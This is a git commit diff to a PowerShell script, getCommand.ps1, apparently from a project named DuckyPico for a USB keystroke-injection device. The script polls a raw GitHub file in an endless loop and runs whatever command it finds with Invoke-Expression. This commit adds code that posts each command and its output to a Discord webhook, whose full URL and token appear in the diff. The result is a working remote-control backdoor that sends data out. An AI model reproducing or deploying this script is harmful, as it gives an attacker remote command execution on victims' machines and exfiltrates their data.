25d647b452979b7635e0077f6122c90500853d47
JH517 <jordanhyde@live.co.uk>
2025-03-26 10:36:31 +0000

    Update getCommand.ps1

--- getCommand.ps1
+++ getCommand.ps1
@@ -1,6 +1,9 @@
 # Define the URL of the GitHub page
 $githubUrl = "https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/command.txt"
 
+# Initialize a variable to store the output
+$output = ""
+
 # Start an infinite loop
 while ($true) {
     try {
@@ -11,9 +14,10 @@ while ($true) {
         if ($command -like "!!*") {
             $command = $command.Substring(2)
         }
-        
+
+
         Write-Host $command
-		
+
         # Check if the command is 'quit' and exit the loop
         if ($command.Trim() -eq "quit") {
             Write-Host "Quit command received. Exiting..."
@@ -21,12 +25,24 @@ while ($true) {
         }
 
         # Run the command
-        Invoke-Expression -Command $command
+        $result = Invoke-Expression -Command $command
+
+		#Print the output to console
+		Write-Host $result
+
+		#Post to Discord
+		$webhookUrl = "https://discord.com/api/webhooks/1354265213477851246/cuHgwA8xLpNhSWpr8A-nz8xnBnKHgG9BsSRrjq6-FV0zJIRYb0WAun4Vaj8INFZnpQQm"
+        $payload = @{content = $command + "`n" + $result} | ConvertTo-Json -Depth 10
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" 
 
         # Wait for 60 seconds before the next iteration
         Start-Sleep -Seconds 60
+
+
+          
     } catch {
         Write-Host "An error occurred: $_"
+        $output += "An error occurred: $_`n"
         Start-Sleep -Seconds 60
     }
-}  # This is the missing closing brace for the while loop
+}
